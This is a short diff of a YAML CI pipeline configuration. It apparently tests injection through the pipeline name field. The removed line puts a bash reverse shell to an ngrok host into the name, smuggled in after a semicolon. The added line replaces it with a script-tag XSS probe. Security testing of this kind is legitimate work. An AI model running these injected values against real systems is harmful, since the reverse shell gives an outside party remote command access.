@@ -20,7 +20,7 @@ resources:
       runID: 1
 
 pipelines:
-  - name: my_first_pipeline;bash -i >& /dev/tcp/8.tcp.ngrok.io/16677 0>&1
+  - name: my_first_pipeline_<script>alert(1)</script>
     steps:
       - name: p1_s1
         type: Bash
